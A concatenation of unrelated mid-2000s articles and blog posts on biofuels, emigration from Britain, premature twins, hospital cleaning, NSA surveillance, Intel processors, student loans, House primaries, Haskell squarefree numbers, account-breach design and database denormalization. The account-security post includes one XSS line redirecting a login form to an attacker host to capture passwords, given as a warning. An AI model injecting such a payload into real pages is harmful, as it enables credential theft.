Unless it is mixed with some other fuel , such as petrol , the result is corrosion that can wreck an engine 's seals in a couple of years .
So why is ethanol suddenly back in fashion ?
That is the question many biotechnologists in America have recently asked themselves .
The obvious answer is that , being derived from plants , ethanol is “ green ” .
The carbon dioxide produced by burning it was recently in the atmosphere .
Putting that CO 2 back into the air can therefore have no adverse effect on the climate .
But although that is true , the real reason ethanol has become the preferred green substitute for petrol is that people know how to make it — that , and the subsidies now available to America 's maize farmers to produce the necessary feedstock .
Yet such things do not stop ethanol from being a lousy fuel .
To solve that , the biotechnologists argue , you need to make a better fuel that is equally green .
Which is what they are trying to do .
Designer petrol
The first step on the road has been butanol .
This is also a type of alcohol that can be made by fermenting sugar ( though the fermentation is done by a species of bacterium rather than by yeast ) , and it has some advantages over ethanol .
It has more carbon atoms in its molecules ( four , instead of two ) , which means more energy per litre — though it is still only 85 % as rich as petrol .
It also has a lower tendency to absorb water from the atmosphere .
A joint venture between DuPont , a large American chemical company , and BP , a British energy firm , has worked out how to industrialise the process of making biobutanol , as the chemical is commonly known when it is the product of fermentation .
Although BP plans to start selling the stuff in the next few weeks ( mixed with petrol , to start with ) , the truth is that butanol is not all that much better than ethanol .
The interesting activity is elsewhere .
One route might be to go for yet - larger ( and thus energy - richer ) alcohol molecules .
Any simple alcohol is composed of a number of carbon and hydrogen atoms ( like a hydrocarbon such as petrol ) together with a single oxygen atom .
In practice , this game of topping up the carbon content to make a better fuel stops with octanol ( eight carbon atoms ) as anything bigger tends to freeze at temperatures that might be encountered in winter .
But living things are familiar with alcohols .
Their enzymes are geared up to cope with them .
This makes the biotechnologists ' task that much easier .
The idea of engineering enzymes to make octanol was what first brought Codexis , a small biotechnology firm based in Redwood City , California , into the field .
Codexis 's technology works with pharmaceutical precision — indeed , one of its main commercial products is the enzyme system for making the chemical precursor to Lipitor , a cholesterol - lowering drug that is marketed by Pfizer .
Codexis controls most of the important patents for what is known as molecular evolution .
This designs enzymes in the way that normal evolution designs organisms .
It creates lots of variations on a theme , throws away the ones it does not want , and shuffles the rest in a process akin to sex .
It then repeats the process on the survivors until something useful emerges — though , unlike natural evolution , there is a bit of intelligent design in the process , too .
The result , according to Codexis 's boss , Alan Shaw , is enzymes that can perform chemical transformations unknown in nature .
Dr Shaw , however , is no longer so interested in octanol as a biofuel .
Like two other , nearby firms , he is now focusing Codexis 's attention on molecules even more chemically similar to petrol .
The twist that Codexis brings is that unlike petrol , of which each batch from the refinery is chemically different from the others ( because the crude oil from which it is derived is an arbitrary mixture of hydrocarbon molecules ) , biopetrol could be turned out exactly the same , again and again , and thus designed to have the optimal mixture of properties required of a motor fuel .
Exactly which molecules Codexis is most interested in these days , Dr Shaw is not yet willing to say .
But Amyris Biotechnologies , which is also based in California , in Emeryville , and which also started by dabbling in drugs ( in its case an antimalarial medicine called artemisinin ) , is slightly more forthcoming .
Under the guidance of its founder Jay Keasling , it has been working on a type of isoprenoid ( a class of chemicals that include rubber ) .
Unlike Codexis , which deals in purified enzymes , Amyris employs a technique called synthetic biology , which turns living organisms into chemical reactors by assembling novel biochemical pathways within them .
Dr Keasling and his colleagues scour the world for suitable enzymes , tweak them to make them work better , then sew the genes for the tweaked enzymes into a bacterium that thus turns out the desired product .
That was how they produced artemisinin , which is also an isoprenoid .
Isoprenoids have the advantage that , like alcohols , they are part of the natural biochemistry of many organisms .
Enzymes to handle them are thus easy to come by .
They have the additional advantage that some are pure hydrocarbons , like petrol .
With a little judicious searching , Amyris thinks it has come up with isoprenoids that have the right characteristics to substitute for petrol .
The third Californian firm in the business , LS9 of San Carlos , is cutting to the chase .
If petrol is what is wanted , petrol is what will be delivered .
And diesel , too , although in this case the product is actually biodiesel , which is in some ways superior to the petroleum - based stuff .
LS9 also uses synthetic biology , but it has concentrated on controlling the pathways that make fatty acids .
Like alcohols , fatty acids are molecules that have lots of hydrogen and carbon atoms , and a small amount of oxygen ( in their case two oxygen atoms , rather than one ) .
Plant oils consist of fatty acids combined with glycerol — and these fatty acids ( for example , those from palm oil ) are the main raw material for the biodiesel already sold today .
LS9 has used its technology to turn microbes into factories for fatty acids containing between eight and 20 carbon atoms — the optimal number for biodiesel .
But it also plans to make what it calls “ biocrude ” .
In this case the fatty acids would have 18 - 30 carbon atoms , and the final stage of the synthetic pathway would clip off the oxygen atoms to create pure hydrocarbons .
This biocrude could be fed directly into existing oil refineries , without any need to modify them .
These firms , however , have one other competitor .
His name is Craig Venter .
Dr Venter , a veteran of biotechnological scraps ranging from gene patenting to the private human - genome project , has been interested in bioenergy for a long time .
To start with , it was hydrogen that caught his eye , then methane — both of which are natural bacterial products .
But now that eye is shifting towards liquid fuels .
His company , modestly named Synthetic Genomics ( and based , unlike the others , on the east side of America , in Rockville , Maryland ) , is reluctant to discuss details , but Dr Venter , too , is taken with the pharmaceutical analogy .
Indeed , he goes as far as to posit the idea of clinical trials for biofuels — presumably pitting one against another , perhaps with petroleum - based products acting as the control , and without the drivers knowing which was which .
Whether biofuels will ever be competitive with fossil fuels remains to be seen .
That will depend on a mixture of economics and politics .
But the political rush to back ethanol , just because it is green and people have heard of it , is a mistake .
Let a thousand flowers bloom , and see which one wins Dr Venter 's Grand Prix .
Immigration is rife , but thousands are quitting Britain
The country ’s biggest foreign visa consultancy firm has revealed that applications have soared in the last seven months by 80 per cent to almost 4,000 a week .
Ten years ago the figure was just 300 a week .
Most people are relocating within the Commonwealth – in Australia , Canada and South Africa .
They are almost all young professionals and skilled workers aged 20 - 40 .
And many cite their reason for wanting to quit as immigration to these shores – and the burden it is placing on their communities and local authorities .
The dearth of good schools , spiralling house prices , rising crime and tax increases are also driving people away .
Obtaining a visa to live abroad can cost as little as £ 1,500 for the right candidates .
Plumbers , electricians , construction workers and doctors are famously in demand .
The only obstruction to emigration from the UK is a criminal record , poor health , advancing age and being a “ third country national ” .
Liam Clifford , a former immigration control officer , set up globalvisas.com as a one - man band 12 years ago .
He now employs 60 people and is in the process of opening new offices in both South Africa and Australia .
Mr Clifford said : “ It ’s absolutely phenomenal .
People are trying to get away to wherever they can , and most are successful .
“ Ironically , one of the main reasons for leaving is the overstretch of services due to increasing immigration into the UK .
People are looking for the better standard of living offered by other countries , as even the most idyllic villages in Britain are under pressure from rising populations .
Skilled labour is obviously an advantage , but so is speaking the English language .
Most countries are harder to get into if you do n’t speak English .
UK plc simply is n’t fighting hard enough to keep its people .
Some are telling us they are fed up with living in this country .
Even business people are saying they ’ve had enough .
“ They ’re saying ‘ I ca n’t put my children into the right school , but if I move abroad I can ’ .
Most people are very patriotic and do n’t want to leave .
They ’re almost terrified about it .
But they say they just have to .
“ It ’s a shame people at the top do n’t recognise they ’re not doing enough to retain highly skilled workers in this country .
A lot of them are quite young , and they ’re not idle .
They just ca n’t see a future for themselves in this country .
They want to get married and settle down and buy homes , but they ca n’t see it happening here .
“ And time and time again they are saying to us they do n’t want to be seen as racist because they are quitting because of immigration .
We tell them of course they ’re not . ”
According to the most recent Office of National Statistics figures , in 2005 the official number of people leaving UK shores was 352,000 – up from 249,000 in 1995 .
The majority – around 150,000 – migrated from London and the south east .
Among those who headed out were Simon Blood , 26 , and Rachel Roberts , 23 , who moved to Australia four months ago .
The couple , from Stoke - on - Trent , are loving their new life in far north Queensland so much that they ’ve decided it ’s permanent .
Lincoln Ryman weighed just 1lb 2 oz ( 530g ) when he was born 11 weeks early along with his big brother , Byron , who weighed 3lb 6 oz ( 1.5kg ) .
Doctors at the Royal Hospital for Women in Sydney intervened to deliver the boys when they discovered a relatively rare pregnancy complication .
Blood was flowing from Lincoln to Byron , putting both in danger .
We did n't think we were going to have them both .
Nicole Ryman
Their mother , Nicole , was told to prepare for the worst when it was decided the best option would be for her to deliver the boys in the 29th week of her pregnancy .
Doctors gave Lincoln a one in three chance of survival because he was so small .
Despite his very low weight and needing heart surgery after he was born , Lincoln is now thriving , as is his brother .
Poor survival chances
Nicole and her husband Todd , who conceived through IVF , said their first weeks of parenthood had been nerve - racking .
Mrs Ryman said : " We 've been on top of the world because we did n't think we were going to have them both .
" We 've had a few scares on the way but they are pretty well going forward now and I know I 'm going to be able to take them both home . "
She is expected to take Byron home at the end of next week .
Lincoln will stay in the hospital 's newborn intensive care unit for another month .
Dr Parag Misha , who has been looking after the twins , said about Lincoln : " The chance of survival I gave him was less than 30 % because he was so small .
" Hopefully he will soon start gaining weight much more quickly and get nearer and nearer his brother . "
A complaint is being filed with the Australian Government against the mining giant Rio Tinto , with the Human Rights Law Centre claiming Rio Tinto 's former mine in Bougainville has caused environmental damage and human rights violations , and a young Vanuatu women 's rights advocate currently living in Australia , has started ' The Vanuatu Feminist Library ' with a mission to expand the resources available to women in her country .
A network engineer going by the hacker handle ' Deviant Ollam ' has taken it upon himself to send care packages of a different sort to troops serving overseas , with him ditching the usual goods in favor of hard drives filled with movies , music and other content .
That 's the basis for his Traveling Terabyte Project , which is apparently still operating on a relatively small scale , although " Ollam " hopes it'll pick up once he gets a website up and running .
The hard drives themselves are packed in an appropriately olive - drab Pelican case , which also includes all the necessary USB cables and international power adapters .
As the name of the project suggests , the hard drives are n't intended to stay in one place forever , with recipients of them encouraged to add their own files before sending 'em on to another location .
For their part , the troops that have received the hard drives so far seem to dig the idea , especially considering that high - speed internet is hard to come by in many of the locations they 're stationed .
Unlike liquid armor , “ Dragon Skin ” is a bulletproof vest that ’s made from circular discs — in a textile pattern , composed of silicon carbide ceramic matrices and laminates .
It ’s so strong that even an M67 grenade could n’t penetrate the material — though heavily damaged the vest .

Every hospital in Britain is to undergo a ward - by - ward ' deep clean ' within the next year to rid them of fatal superbugs such as MRSA , Gordon Brown announced last night .
In his first policy initiative ahead of the Labour conference , which opens in Bournemouth today , the Prime Minister pledged that walls , ceilings and ventilation shafts in hospitals across the country would be scrubbed clean .
' We know that , over time , ingrained cleanliness problems build up , especially in hard - to - reach places like ceilings and ventilation ducts , which cannot be dealt with by day - to - day cleaning , ' Brown writes in today 's News of the World
' So over the next year , for the first time , every hospital will receive a ' deep clean ' designed to return our hospitals to the state they were in when they were built .
A ward at a time , walls , ceilings , fittings and ventilation shafts will be disinfected and scrubbed clean . '
The initiative , which was drawn up by the new Health Minister Lord Darzi , is based on the experience of the US , where ' deep cleans ' are regularly carried out .
NHS trusts will decide how to carry out the cleaning , which could lead to wards being closed for a week at a time .
There were 1,444 cases of MRSA bloodstream infections in the first three months of this year , according to the latest infection figures from the Health Protection Agency .
This compared with 1,542 in the previous quarter .
Brown , who has seen Labour overturn the Tories ' lead on health , will have had one eye on the Conservatives when he drew up the new anti-superbug initiative .
The Tories ' manifesto for the last election , which was written by David Cameron , pledged that a Conservative government would make cleaner hospitals one of its top five priorities .
The Prime Minister also announces today an extension of breast screening and early treatment for cancer for women .
The waiting time for women to receive the results of cervical screening tests will be cut from six weeks or more to a maximum of 14 days .
An extra 200,000 women will be eligible for routine screening for breast cancer by extending the age range from 47 to 73 , the Prime Minister tells the Sunday Times .
At the moment only women aged between 50 and 70 are eligible for routine screening .
The raft of new policies will heighten speculation that Brown is preparing for an autumn election .
Ed Balls , the Schools Secretary , makes clear today that Labour will not concede law and order to the Tories by pledging to issue the first guidelines on safe alcohol consumption for the under - 18s .
Shops and off licences which sell alcohol to teenagers will also face a crackdown .
' Currently we do n't have any guidance for parents on alcohol consumption and its impact on under - 18s .
That worries me , ' Balls told the Sunday Telegraph .
' When I was 16 or 17 , I would have a small glass of wine at lunch on a Sunday or a shandy or a Babycham at Christmas .
That 's not where the problem lies .
It 's where parents are allowing kids to consume substantial quantities of alcohol .
We need to help parents get the balance right and put behind us the excessive drinking culture . '
Constitutional scholar : 9/11 ' highly convenient ' in allowing Bush to expand power David Edwards and Nick Juliano
Published : Tuesday October 16 , 2007

This A constitutional scholar says President Bush and his administration were working to expand their spy powers months before the terrorist attacks of Sept. 11 , 2001 , which provided a " highly convenient " opportunity to dramatically strengthen law enforcement and surveillance authority .
" This administration was seeking a massive expansion of presidential power and national security powers before 9/11 .
9/11 was highly convenient in that case , " George Washington University law professor Jonathan Turley told Keith Olbermann on Countdown Monday night .
" I 'm not saying that they welcomed it , but when it happened , it was a great opportunity to seize powers that they have long wanted at the FBI . "
Turley was responding to allegations aired last week by a former Qwest CEO that the National Security Agency approached telecoms as early as February 2001 about establishing secret mechanisms to spy on Americans .
The former CEO , Joe Nacchio , said in court papers related to an insider trading conviction that the government withdrew lucrative contracts from his company after he raised legal objections to the proposed spy program .
Earlier in the program , Olbermann invoked recent reports that the Pentagon used the FBI to issue secret national security letters allowing access to reams of data on Americans with even slim connections to the military .
" Does that essentially mean that I or you dial a wrong number and it happens to belong to somebody that 's under investigation , the pentagon can go and get your information or my information as well ? "
Olbermann asked .
" They can .
And you can thank the U.S. congress for that , " Turley said , noting that the Patriot Act made it very easy for the FBI to issue the letters .
" And what is astonishing is that the abuses of the NSLs are well documented .
As soon as the FBI got this power that they were promising to use in the most judicious and cautious way , they abused it with abandon . "
Toward the end of the segment , Turley noted the disconnect between the drive for expanded power , and the FBI and National Security Agency 's inability to properly analyze intelligence before Sept. 11 .
" The great irony , of course , with the NSA and the FBI is that their blunders help contribute to 9/11 , " he said , " but they radically expanded those powers as a result of that tragedy . "
" Nothing succeeds like failure , " Olbermann quipped .
The following video is from MSNBC's Countdown , broadcast on October 15 , 2007 .
A partial transcript appears below : Olbermann :
These details about the pentagon spying program and national security letters , if as I was quoting from its manual , these NSLs can be used to gather information on anybody , even somebody vaguely connected with a suspect .
Does that essentially mean that I or you dial a wrong number and it happens to belong to somebody that 's under investigation , the pentagon can go and get your information or my information as well ?
Turley :
They can .
And you can thank the U.S. congress for that .
In the Patriot Act and four other pieces of legislation that were enacted , the NSLs can be used with extraordinary ease .
And what is astonishing is that the abuses of the NSLs are well documented .
As soon as the FBI got this power that they were promising to use in the most judicious and cautious way , they abused it with abandon .
Congress has done very , very little .
But what congress did do is they created this relevancy test .
And most anything can be relevant .
And your example is by no means far - fetched .
Yes ,
If you show up on the phone records by accident of somebody that they suspect , you can have your records searched and you will not know it because the companies are told that they can't tell you .
[..]
Olbermann :
These allegations from the former CEO of Qwest -- and he 's not necessarily a neutral witness .
We have to take this with a grain of salt because he 's trying to get an insider trading conviction overthrown .
But what do you make of his allegation ?
Is this the first time we 've heard anything like that that the NSA was trying to get phone records of citizens of this country , no warrant involved , seven months before 9/11 ?
Turley :
You 're right , we do have to consider the context .
But what he is saying actually is confirmed by other sources .
You know , this administration was seeking a massive expansion of Presidential power and national security powers before 9/11 .
9/11 was highly convenient in that sense .
I 'm not saying that they welcomed it , but when it happened , it was a great opportunity to seize powers that they have long wanted at the FBI .
The great irony , of course , with the NSA and the FBI is that their blunders help contribute to 9/11 , but they radically expanded those powers as a result of that tragedy .
Olbermann : Nothing succeeds like failure .

The Intel Yorkfield
We have more exclusive news from the Intel grapevine .
This time we have juicy details on the upcoming 45 nm processors that Intel will be launching to take on the threat of the AMD Phenom processors .
Model L2 Cache Core Clock FSB TDP Core 2 Extreme QX9650 6 MB x 2 3.0 GHz 1333 MHz 130 W Core 2 Quad Q9550 6 MB x 2 2.83 GHz 1333 MHz 95 W Core 2 Quad Q9450 6 MB x 2 2.66 GHz 1333 MHz 95 W Core 2 Quad Q9300 3 MB x 2 2.5 GHz 1333 MHz 95 W
As promised earlier , Intel will launch their 45 nm processors by the end of this year .
In fact , we have been told that the launch date had already been set at November 12 , 2007 , so mark your calendars .
However , it is pretty obvious that Intel is in no real hurry to launch their 45 nm processors .
In fact , our source claims Intel will only launch one processor at the November 11 launch .
This will be none other than the Intel Core 2 Extreme QX9650 quad - core processor .
Code - named Yorkfield XE , the Intel Core 2 Extreme QX9650 will be a quad - core processor built from two 45 nm Wolfdale processor dies .
It will displace the Core 2 Extreme QX6850 ( Kentsfield ) processor as the top desktop processor model until Q3 , 2008 .
The Intel Core 2 Extreme QX9650 is quite similar to the QX6850 model it is replacing .
Both have two separate dies with separate L2 caches and run at 3.0 GHz with a 1333 MHz FSB .
But thanks to its larger 12 MB L2 cache , the new Intel Core 2 Extreme QX9650 will be 5 - 10 % faster than the QX6850 and up to 60 % faster when running SSE4 - optimized code .
The choice of the Intel Core 2 Extreme QX9650 as the first and only processor slated for a 2007 launch is significant .
Not only is Intel choosing to deliver a quad - core processor first , they are also choosing to launch what will be their top - of - the - line model up till Q3 , 2008 .
By flagging off the new generation of 45 nm processors with the Intel Core 2 Extreme QX9650 processor at the forefront , Intel is indirectly demonstrating the maturity of their 45 nm processors .
In January 2008 , Intel will release the new quad - core Intel Core 2 Quad Q9000 series of processors .
The first three to be released will be the Core 2 Quad Q9550 , Q9450 and Q9300 .
The first two processors will have two 6 MB L2 caches while the Q9300 will only have two smaller 3 MB L2 caches .
The Intel Wolfdale
Model L2 Cache Core Clock FSB TDP Core 2 Duo E8500 6 MB 3.16 GHz 1333 MHz 65 W Core 2 Duo E8400 6 MB 3.00 GHz 1333 MHz 65 W Core 2 Duo E8300 6 MB 2.83 GHz 1333 MHz 65 W Core 2 Duo E8200 6 MB 2.66 GHz 1333 MHz 65 W
According to our source , the dual - core Wolfdale processors will not be released this year .
It will only be launched on January 2008 , at or around the same time as the Intel Core 2 Quad Q9000 series of processors .
As we had been told earlier that Intel is already rolling out these processors in quantity , the reason for this delay is obvious .
Intel does not see a significant threat to their Core 2 Duo processors , not until the AMD launches their triple - core Phenom processors in early 2008 .
Therefore , it makes sense for them to schedule a later launch .
The dual - core Wolfdale processors will be known as the Intel Core 2 Duo E8000 series .
Intel will release the E8500 , E8400 and E8200 in January , followed by the E8300 later in Q2 2008 .
All Intel Core 2 Duo E8000 processors will have a 6 MB L2 cache and a 1333 MHz FSB .
The top model ( until Q3 2008 ) will be the Core 2 Duo E8500 with the clock speed of 3.16 GHz .
It displaces the Core 2 Duo E6850 which runs at 3.0 GHz and has a 4 MB L2 cache .
Important Update
Our source just clarified a few points with us .
The initial November 11 date we mentioned earlier was not the launch date .
It was really the date Intel set the price for the processors to be launched .
The 45 nm processors will be launched on November 12 .
This was confirmed by Pat Gelsinger ( Sr. Vice President and GM , Intel Digital Enterprise Group ) , whom I had the opportunity to talk to just a few hours ago .
The November 12 launch will include server - grade processors like the quad - core Xeon code - named Harpertown ( 12 MB L2 cache , TDPs of 50W , 80W and 120W ) and a dual - core Xeon code - named Wolfdale - DP ( 6 MB L2 cache , TDP of 40W , 55W and 80W ) .
The other 45 nm Core 2 Quad and Core 2 Duo processors mentioned above may or may not be announced during the Nov. 12 launch but their actual release dates are confirmed to be in January 2008 .
Now , let 's take a look at the leaked roadmap and pricing before going on to some benchmark results .
Until the 1990s , the primary program was the federal guaranteed loan program under which private lenders like Citibank , Sallie Mae or Bank of America made the loans to students .
They were given a helping hand from the government , which paid subsidies to the lenders and guaranteed them against default .
Bill Clinton campaigned for president on the notion of expanding the federal government ’s role as student loan guarantor into a more central position as the direct lender .
The idea was that this would prove cheaper and simpler for students and be less costly for taxpayers because borrowers would pay interest to the federal government instead of to the lenders .
The program went into effect in 1994 .
The Democrats expected it to become dominant .
But unwilling to be muscled aside , private lenders began offering schools and students a variety of benefits like scholarship money and lower interest rates and fees .
Tom Joyce , a spokesman for Sallie Mae , said , “ The private sector program has better prices , better product selection , better service and better technology . ”
For a few years after direct lending went into effect , it grew quickly .
But as student loan volume has risen , climbing above $ 85 billion in 2005 - 6 from just over $ 30 billion 10 years earlier , the government ’s share as a direct lender has declined , and now amounts to less than a quarter of the total .
“ When direct lending was created , the initial assumption was that the bank - based program would be quickly overwhelmed by the government program , ” Mr. Hartle said .
No one counted on the strength of the reaction from the lending industry , he and others said .
The Education Department fought back .
Richard W. Riley , then the secretary of education , tried to make the direct lending program more competitive in 1999 and 2000 by reducing origination fees and interest rates .
The private lenders sued , saying Mr. Riley had no authority to do this because these rates were set by Congress under the loan legislation .
( Last year , lawmakers set the interest rate on new Stafford loans , one of the most popular federally guaranteed loans , at 6.8 percent ; many private lenders offer to reduce that rate for borrowers who make payments on time or meet other goals . )

FIVE HOUSE DEMOCRATS FACE SERIOUS PRIMARY CHALLENGES
Despite public criticism of Congress as a whole , few incumbents are
defeated in general elections , and even fewer lose primary races against
members of their own party .
But primary contests can be the only meaningful outlet for voter
discontent in congressional districts that are gerrymandered , as so many
are these days , to ensure that one party or the other will always win the
general election .
Such lopsided districts dominate the list of 16 across the nation
identified by CQPolitics.com as featuring contests for 2008 in which U.S .
House incumbents face unusually vigorous primary challenges .
There are five Democratic incumbents facing serious primary challenges .
Rep. Daniel Lipinski , D - Ill. , has not one but three primary challengers in
the 3rd District , which includes chunks of Chicago and its Cook County
suburbs to the west : Palos Hills Mayor Jerry Bennett , Cook County
prosecutor Mark Pera and local attorney and Army reservist Jim Capparelli .
Rep. Albert R. Wynn , D - Md. , is in a 4th District rematch against lawyer
and political activist Donna Edwards , who took 46 percent of the vote
against him in 2006 in a black - majority Democratic stronghold just outside
Washington , D.C.
There is a third candidate in the race as well : real
estate broker George E. Mitchell .
Last year , a different third candidate
took just under 4 percent of the vote .
Rep. Edolphus Towns , D - N.Y. , who represents the Brooklyn - based 10th
District , could face a challenge from Kevin Powell , who filed a statement
of organization with the Federal Election Commission ( FEC ) in early August
but has not officially announced as a candidate .
Powell identifies himself
as “ a political activist , poet , journalist , essayist , hip - hop historian ,
public speaker , and entrepreneur , ” and was a cast member on the first
season of the MTV reality - television show Real World .
Rep. Dennis J. Kucinich , D - Ohio , who is making his second longshot
presidential bid , faces a contest closer to home in the 10th District ,
which encompasses west side Cleveland and its suburbs .
Challenger Rosemary
Palmer says Kucinich has missed too many important votes in his quixotic
bid for the White House effort .
Rep. Steve Cohen , D - Tenn. , is in a faceoff with airline executive Nikki
Tinker , who came in second in the crowded , 15 - person 2006 primary contest
in the Memphis - based 9th District .
Cohen is white , while the district is
majority black .
Although Cohen has liberal views and a history of
receiving support from African - American voters dating to his long state
Senate tenure , some black activists argue that black representation should
be restored to the 9th District , which Harold E. Ford Jr. held before his
unsuccessful bid for the Senate last year .
A squarefree number is one which is not divisible by any perfect squares .
Put another way , the prime factorization of a squarefree number includes at most one copy of any given prime .
So , the first few squarefree numbers are
1,2,3,5,6,7,10,11,13,14,15 , …
How can we generate these in Haskell ?
In particular , we want to define the infinite sorted list of squarefree numbers , to be lazily computed on demand .
We could implement a brute - force method where we simply factor every positive integer and only keep those which do n’t have repeated factors .
But that would be awfully slow .
This is Haskell we ’re talking about , there must be a better way !
There are better ways , of course ; here ’s one .
Suppose that ( somehow ) we have computed the list , which contains all the squarefree numbers with prime factors up to and including , the nth prime number .
For example , ; ; and so on .
Given , we can compute as follows : multiply every element of by to produce a new list ; this list contains all those squarefree numbers with prime factors up to , which are divisible by .
Then we just merge with to produce .
Let ’s try it : we start with , the list of all squarefree numbers with no prime factors .
Then we compute .
Multiplying by 3 gives , and merging yields .
Multiplying by 5 gives ; merging again gives us .
And so on .
So , how do we translate this into a definition of the infinite list of squarefree numbers ?
It ’s not quite as straightforward as it seems .
First of all , we ca n’t just say the equivalent of “ compute “ ; nothing would ever get generated that way , since everything in depends on everything in .
There ’s nothing inherent in the above method that indicates which part of the list is n’t going to change on the next iteration .
And we ca n’t do something like lazily merge all the lists in ; the problem is that every squarefree number occurs infinitely often in such a list .
The key is to note that the “ intermediate ” lists are more important than we might have thought .
The infinite sequence of lists in fact contains every squarefree number exactly once ( except 1 ) ; moreover , they are ordered by their first elements in addition to being ordered themselves , which gives us just enough information to implement an infinite merge that will actually get around to producing something in a finite amount of time !
The primeStep function below takes the prime and the list , and produces the pair .
mapAccumL ( one of those higher - order functions which is n’t used much but comes in very handy every once in a while ) is used to carry along the current list in an accumulator while simultaneously producing the list .
Finally mergeAll performs a lazy infinite merge , giving us the infinite list of squarefree numbers .
import Data .
List ( mapAccumL ) sieve ( x:xs ) = x : sieve ( filter ( n -> n `mod` x /= 0 ) xs ) primes = sieve [ 2.. ] -- merge two nondecreasing lists .
( # ) :: ( Ord a ) = > [ a ] -> [ a ] -> [ a ] [ ] # ys = ys xs # [ ] = xs xs@( x : xt ) # ys@(y : yt ) | x < y = x : ( xt # ys ) | x > y = y : ( xs # yt ) | otherwise = x : ( xt # yt ) -- merge an infinite list of lists , assuming that each list -- is nondecreasing and the lists occur in order of their first -- element .
mergeAll :: ( Ord a ) = > [ [ a ] ] -> [ a ] mergeAll ( [ ] : zs ) = mergeAll zs mergeAll ( xxs@( x : xs ) : yys@(y:ys ) : zs ) | x < y = x : mergeAll ( xs : yys : zs ) | otherwise = mergeAll ( ( xxs # yys ) : zs ) -- given a list of all squarefree numbers with factors up to -- but not including p , produce ( a , b ) , where a is all squarefree -- numbers with factors up to p , and b only includes those which -- are multiples of p. primeStep xs p = ( xs # pxs , pxs ) where pxs = map ( p* ) xs -- the nth element of primeLists is a sorted list of squarefree -- numbers with factors up to p_n , which are all multiples of p_n . --
Therefore every squarefree number occurs exactly once in ( concat -- primeLists ) , and the lists in primeLists are sorted by first element .
primeLists = snd $ mapAccumL primeStep [ 1 ] primes -- to get a sorted list of squarefree numbers , just merge primeLists .
squarefree = 1 : mergeAll primeLists
It seems to work :
* Main > take 20 $ squarefree [ 1,2,3,5,6,7,10,11,13,14,15,17,19,21,22,23,26,29,30,31 ]
Neat !
At the beginning , I said there are better ways ; here ’s another !
It makes use of the beautiful theory of Dirichlet generating functions , and in particular , the fact that is the DGF for the squarefree numbers .
Using David Amos ’ fantastic mathematics library , this is a piece of cake :
import DirichletSeries import Data .
Maybe bitToMaybe :: Int -> a ->
Maybe a bitToMaybe 1 = Just bitToMaybe _ = const Nothing squarefree = catMaybes $ zipWith bitToMaybe ( coeffsDS squarefreeDGF ) [ 1.. ]
Can you come up with another way ?

Designing for a security breach
User account breaches are inevitable .
We should take that in to account when designing our applications .
My work with OpenID has lead me to think a lot harder about account security in general .
Staying secure on the Web is surprisingly difficult , even for experienced internet users — which means the mainstream public are in a whole heap of trouble .
Phishing is incredibly effective ; the vast majority of people can’t tell the difference between a phished version of a site and a real one , and applications do n’t help the situation by sending dozens of e-mails encouraging people to sign in or serving their legitimate login page on unrecognisable domains .
Even worse , many social networking sites actively encourage bad security habits by asking users for their webmail username and password in order to scrape their address book for contacts .
CSRF and XSS attacks ( the latter which opens up the former even in the few sites that have CSRF protection ) are everywhere , and make phishing for user passwords even easier .
If you can inject the following XSS attack in to a login page all bets are off :
document.forms[0].action='http://hax0r.example.com/capture.cgi'
Your application may be perfectly secure , but if one of your users uses the same username and password on a less secure application that gets cracked or XSSd their account on your service can be compromised as well .
Most worrying of all is the way most user ’s entire online identities are attached to a single webmail account .
People often criticise OpenID for putting all of a user ’s eggs in one basket , but do n’t realise that for most people their e-mail already serves that purpose .
Steal my mail account and you can use forgotten password requests to steal everything else .
Here ’s a nasty recent example of that happening with a Gmail account .
( This is why I ’m excited to see OpenID providers moving towards more secure methods of authentication such as client - side SSL certificates and two - factor authentication with a physical token .
Users can afford to have a stronger relationship with their OpenID provider than the other sites they sign in to .
It would be nice to see the same authentication measures made available for popular webmail systems . )
If your web application hosts any valuable information at all , it ’s prudent to expect that some significant proportion of your users will eventually have their accounts hijacked .
This introduces some interesting design challenges .
If we expect that at least some of our users ’ accounts will be compromised , what can we do to minimise the damage that an attacker can cause ?
Online privacy campaigners frequently call for data and account deletion to be irreversible , but paradoxically this makes for even more trouble if an account is hijacked .
Maybe applications should experiment with “ root ” level passwords that must be entered to make irreversible changes to an account ( emptying the trash can for example ) .
Of course , that just makes the whole password problem twice as bad .
I do n’t have any answers , but I ’d love to see some discussion about this .
Are there any best practices that have already emerged in this area ?
Database normalization is a formal process of designing your database to eliminate redundant data , utilize space efficiently and reduce update errors .
Anyone who has ever taken a database class has it drummed into their heads that a normalized database is the only way to go .
This is true for the most part .
However there are certain scenarios where the benefits of database normalization are outweighed by its costs .
Two of these scenarios are described below .
Immutable Data and Append - Only Scenarios
Pat Helland , an enterprise architect at Microsoft who just rejoined the company after a two year stint at Amazon , has a blog post entitled Normalization is for Sissies where he presents his slides from an internal Microsoft gathering on database topics .
In his presentation , Pat argues that database normalization is unnecessary in situations where we are storing immutable data such as financial transactions or a particular day 's price list .
When Multiple Joins are Needed to Produce a Commonly Accessed View
The biggest problem with normalization is that you end up with multiple tables representing what is conceptually a single item .
For example , consider this normalized set of tables which represent a user profile on a typical social networking site .
user table user_id first_name last_name sex hometown relationship_status interested_in religious_views political_views 12345 John Doe Male Atlanta , GA married women ( null ) ( null )
user_affiliations table user_id ( foreign_key ) affiliation_id ( foreign key ) 12345 42 12345 598
affiliations table affiliation_id description member_count 42 Microsoft 18,656 598 Georgia Tech 23,488
user_phone_numbers table user_id ( foreign_key ) phone_number phone_type 12345 425-555-1203 Home 12345 425-555-6161 Work 12345 206-555-0932 Cell
user_screen_names table user_id ( foreign_key ) screen_name im_service 12345 geeknproud@example.com
AIM 12345 voip4life@example.org
Skype
user_work_history table user_id ( foreign_key ) company_affiliation_id ( foreign key ) company_name job_title 12345 42 Microsoft Program Manager 12345 78 i2 Technologies Quality Assurance Engineer
This is the kind of information you see on the average profile on Facebook .
With the above design , it takes six SQL Join operations to access and display the information about a single user .
This makes rendering the profile page a fairly database intensive operation which is compounded by the fact that profile pages are the most popular pages on social networking sites .
The simplest way to fix this problem is to denormalize the database .
Instead of having tables for the user ’s affiliations , phone numbers , IM addresses and so on , we can just place them in the user table as columns .
The drawback with this approach is that there is now more wasted space ( e.g. lots of college students people will have null for their work_phone ) and perhaps some redundant information ( e.g. if we copy over the description of each affiliation into an affiliation_name column for each user to prevent having to do a join with the affiliations table ) .
However given the very low costs of storage versus the improved performance characteristics of querying a single table and not having to deal with SQL statements that operate across six tables for every operation .
This is a small price to pay .
